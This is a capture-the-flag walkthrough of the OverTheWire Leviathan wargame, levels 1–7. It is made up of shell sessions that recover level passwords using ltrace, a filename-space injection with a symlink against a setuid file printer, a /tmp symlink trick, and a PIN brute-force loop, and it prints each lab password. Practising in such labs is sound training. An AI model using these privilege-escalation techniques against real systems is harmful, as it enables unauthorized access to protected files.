# Leviathan

## Level 1

```bash
➜ ssh leviathan.labs.overthewire.org -p 2223 -l leviathan0
# Password: leviathan0

leviathan0@gibson:~$ find -ls
   552233      4 drwxr-xr-x   3 root     root         4096 Apr 10 14:23 .
   552234      4 -rw-r--r--   1 root     root          807 Mar 31  2024 ./.profile
   552235      4 -rw-r--r--   1 root     root         3771 Mar 31  2024 ./.bashrc
   551405      4 drwxr-x---   2 leviathan1 leviathan0     4096 Apr 10 14:23 ./.backup
   552276    132 -rw-r-----   1 leviathan1 leviathan0   133259 Apr 10 14:23 ./.backup/bookmarks.html
   552236      4 -rw-r--r--   1 root       root            220 Mar 31  2024 ./.bash_logout

leviathan0@gibson:~$ cat .backup/bookmarks.html | grep -in 'leviathan'
1049:<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

> Password: `3QJ3TgzHDq`

## Level 2

```bash
➜ ssh leviathan.labs.overthewire.org -p 2223 -l leviathan1
# Password: 3QJ3TgzHDq

leviathan1@gibson:~$ find -ls
   552239      4 drwxr-xr-x   2 root     root         4096 Apr 10 14:23 .
   552277     16 -r-sr-x---   1 leviathan2 leviathan1    15084 Apr 10 14:23 ./check
   552240      4 -rw-r--r--   1 root       root            807 Mar 31  2024 ./.profile
   552241      4 -rw-r--r--   1 root       root           3771 Mar 31  2024 ./.bashrc
   552242      4 -rw-r--r--   1 root       root            220 Mar 31  2024 ./.bash_logout

leviathan1@gibson:~$ ./check
password: password
Wrong password, Good Bye ...

leviathan1@gibson:~$ ltrace ./check
__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
printf("password: ")                                                       = 10
getchar(0, 0, 0x786573, 0x646f67password: password
)                                          = 112
getchar(0, 112, 0x786573, 0x646f67)                                        = 97
getchar(0, 0x6170, 0x786573, 0x646f67)                                     = 115
strcmp("pas", "sex")                                                       = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                       = 29
+++ exited (status 0) +++
leviathan1@gibson:~$ ./check
password: sex
$ id
uid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)

$ cat /etc/leviathan_pass/leviathan2
NsN1HwFoyN
```

> Password: `NsN1HwFoyN`

## Level 3

```bash
➜ ssh leviathan.labs.overthewire.org -p 2223 -l leviathan2
# Password: NsN1HwFoyN

leviathan2@gibson:~$ find -ls
   552244      4 drwxr-xr-x   2 root     root         4096 Apr 10 14:23 .
   552245      4 -rw-r--r--   1 root     root          807 Mar 31  2024 ./.profile
   552246      4 -rw-r--r--   1 root     root         3771 Mar 31  2024 ./.bashrc
   552279     16 -r-sr-x---   1 leviathan3 leviathan2    15072 Apr 10 14:23 ./printfile
   552247      4 -rw-r--r--   1 root       root            220 Mar 31  2024 ./.bash_logout

leviathan2@gibson:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@gibson:~$ ./printfile /etc/hosts
127.0.0.1 localhost

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
5.44.104.158 wc2.wechall.net
127.0.0.1 behemoth behemoth.labs.overthewire.org
127.0.0.1 leviathan leviathan.labs.overthewire.org
127.0.0.1 manpage manpage.labs.overthewire.org
127.0.0.1 maze maze.labs.overthewire.org
127.0.0.1 narnia narnia.labs.overthewire.org
127.0.0.1 utumno utumno.labs.overthewire.org
127.0.0.1 vortex vortex.labs.overthewire.org

leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...

leviathan2@gibson:~$ ltrace ./printfile /etc/hostname
__libc_start_main(0x80490ed, 2, 0xffffd474, 0 <unfinished ...>
access("/etc/hostname", 4)                                                 = 0
snprintf("/bin/cat /etc/hostname", 511, "/bin/cat %s", "/etc/hostname")    = 22
geteuid()                                                                  = 12002
geteuid()                                                                  = 12002
setreuid(12002, 12002)                                                     = 0
system("/bin/cat /etc/hostname"gibson
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                     = 0
+++ exited (status 0) +++
```

The file fire checks if we have READ access to specified filename and if yes then it's printed using `cat` in `cat %s` format.
```bash
leviathan2@gibson:~$ man access
int access(const char *pathname, int mode); # 4 = r-- (rwd)
```

```bash
leviathan2@gibson:~$ cd `mktemp -d`
leviathan2@gibson:/tmp/tmp.w6n5NGppzw$ chmod 777 $_
leviathan2@gibson:/tmp/tmp.w6n5NGppzw$ echo 'hello' > '1 2'
leviathan2@gibson:/tmp/tmp.w6n5NGppzw$ echo 'hello' > '1'
leviathan2@gibson:/tmp/tmp.w6n5NGppzw$ echo 'hello' > '1 2'
leviathan2@gibson:/tmp/tmp.w6n5NGppzw$ ~/printfile 1
hello
leviathan2@gibson:/tmp/tmp.w6n5NGppzw$ ~/printfile '1 2'
hello
/bin/cat: 2: No such file or directory
```

The usage of `%s` in `cat` allows you to read multiple files.

Create a dummy file with a space in filename, then symlink the password to first word of dummy filename, leak the contents via "feature"
```bash
leviathan2@gibson:/tmp/tmp.w6n5NGppzw$ echo 'pwned' > 'letmein please'
leviathan2@gibson:/tmp/tmp.w6n5NGppzw$ ln -s /etc/leviathan_pass/leviathan3 'letmein'
leviathan2@gibson:/tmp/tmp.w6n5NGppzw$ ~/printfile 'letmein please'
f0n8h2iWLP
/bin/cat: please: No such file or directory
```

> Password: `f0n8h2iWLP`

## Level 4

```bash
➜ ssh leviathan.labs.overthewire.org -p 2223 -l leviathan3
# Password: f0n8h2iWLP

leviathan3@gibson:~$ find -ls
   552249      4 drwxr-xr-x   2 root     root         4096 Apr 10 14:23 .
   552250      4 -rw-r--r--   1 root     root          807 Mar 31  2024 ./.profile
   552281     20 -r-sr-x---   1 leviathan4 leviathan3    18100 Apr 10 14:23 ./level3
   552251      4 -rw-r--r--   1 root       root           3771 Mar 31  2024 ./.bashrc
   552252      4 -rw-r--r--   1 root       root            220 Mar 31  2024 ./.bash_logout
```

Program prompts for password, which seems to be `snlprintf`, however it spawns shell under the same user so no privilege escalation.
```bash
leviathan3@gibson:~$ ./level3
Enter the password> password
bzzzzzzzzap. WRONG
leviathan3@gibson:~$ ltrace ./level3
__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                 = -1
printf("Enter the password> ")                                             = 20
fgets(Enter the password> password
"password\n", 256, 0xf7fae5c0)                                       = 0xffffd26c
strcmp("password\n", "snlprintf\n")                                        = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                 = 19
+++ exited (status 0) +++
```

Enter password and read password
```bash
leviathan3@gibson:~$ ./level3
Enter the password> snlprintf
[You ve got shell]!
$ cat /etc/leviathan_pass/leviathan4
WG1egElCvO
```

> Password: `WG1egElCvO`

## Level 5

```bash
➜ ssh leviathan.labs.overthewire.org -p 2223 -l leviathan4
# Password: WG1egElCvO

leviathan4@gibson:~$ find -ls
   552254      4 drwxr-xr-x   3 root     root         4096 Apr 10 14:23 .
   552255      4 -rw-r--r--   1 root     root          807 Mar 31  2024 ./.profile
   552283      4 dr-xr-x---   2 root     leviathan4     4096 Apr 10 14:23 ./.trash
   552284     16 -r-sr-x---   1 leviathan5 leviathan4    14940 Apr 10 14:23 ./.trash/bin
   552256      4 -rw-r--r--   1 root       root           3771 Mar 31  2024 ./.bashrc
   552257      4 -rw-r--r--   1 root       root            220 Mar 31  2024 ./.bash_logout
```

```bash
leviathan4@gibson:~$ ./.trash/bin
00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010

leviathan4@gibson:~$ ./.trash/bin | python3 -c 'print("".join(chr(int(c,2)) for c in input().split()))'
0dyxT7F4QD
# or
leviathan4@gibson:~$ ./.trash/bin | perl -lpe 's/ //g; $_=pack("B*",$_)'
0dyxT7F4QD
```

> Password: `0dyxT7F4QD`

## Level 6

```bash
➜ ssh leviathan.labs.overthewire.org -p 2223 -l leviathan5
# Password: 0dyxT7F4QD

leviathan5@gibson:~$ find -ls
   552259      4 drwxr-xr-x   2 root     root         4096 Apr 10 14:23 .
   552260      4 -rw-r--r--   1 root     root          807 Mar 31  2024 ./.profile
   552286     16 -r-sr-x---   1 leviathan6 leviathan5    15144 Apr 10 14:23 ./leviathan5
   552261      4 -rw-r--r--   1 root       root           3771 Mar 31  2024 ./.bashrc
   552262      4 -rw-r--r--   1 root       root            220 Mar 31  2024 ./.bash_logout
```

```bash
# Check what binary does
leviathan5@gibson:~$ ./leviathan5
Cannot find /tmp/file.log
# Create the file it wants
leviathan5@gibson:~$ echo 'letmein' > /tmp/file.log
# Test
leviathan5@gibson:~$ ./leviathan5
letmein
# Test again, file is removed
leviathan5@gibson:~$ ./leviathan5
Cannot find /tmp/file.log
# Use symlink to read password
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
# Read file
leviathan5@gibson:~$ ./leviathan5
szo7HDB88w
```

> Password: `szo7HDB88w`

## Level 7

```bash
➜ ssh leviathan.labs.overthewire.org -p 2223 -l leviathan6
# Password: szo7HDB88w

leviathan6@gibson:~$ find -ls
   552264      4 drwxr-xr-x   2 root     root         4096 Apr 10 14:23 .
   552265      4 -rw-r--r--   1 root     root          807 Mar 31  2024 ./.profile
   552266      4 -rw-r--r--   1 root     root         3771 Mar 31  2024 ./.bashrc
   552267      4 -rw-r--r--   1 root     root          220 Mar 31  2024 ./.bash_logout
   552290     16 -r-sr-x---   1 leviathan7 leviathan6    15036 Apr 10 14:23 ./leviathan6
```

Looks like we have to brute the PIN
```bash
leviathan6@gibson:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
leviathan6@gibson:~$ ./leviathan6 1111
Wrong
leviathan6@gibson:~$ ./leviathan6 1234
Wrong
```

```bash
leviathan6@gibson:~$ nano /tmp/brute.sh
#!/bin/bash

for pin in $(seq -w 0000 9999); do
    echo "Trying PIN: $pin"
    output=$(./leviathan6 "$pin")
    if [[ "$output" != "Wrong" ]]; then
        echo "✅ Found PIN: $pin"
        echo "Output: $output"
        break
    fi
done

# or just
leviathan6@gibson:~$ for pin in $(seq -w 0000 9999); do echo "Trying PIN: $pin"; output=$(./leviathan6 "$pin"); if [[ "$output" != "Wrong" ]]; then echo "✅ Found PIN: $pin"; echo "Output: $output"; break; fi; done
...
Trying PIN: 7121
Trying PIN: 7122
Trying PIN: 7123
id
Ctrl+D -> Interrupt the stdin
✅ Found PIN: 7123
Output: uid=12007(leviathan7) gid=12006(leviathan6) groups=12006(leviathan6)
```

::: info Note
Quick and dirty way to exit was to use `Ctrl+D`
:::

```bash
leviathan6@gibson:~$ ./leviathan6 7123
$ cat /etc/leviathan_pass/leviathan7
qEs5Io5yM8
```

> Password: `qEs5Io5yM8`
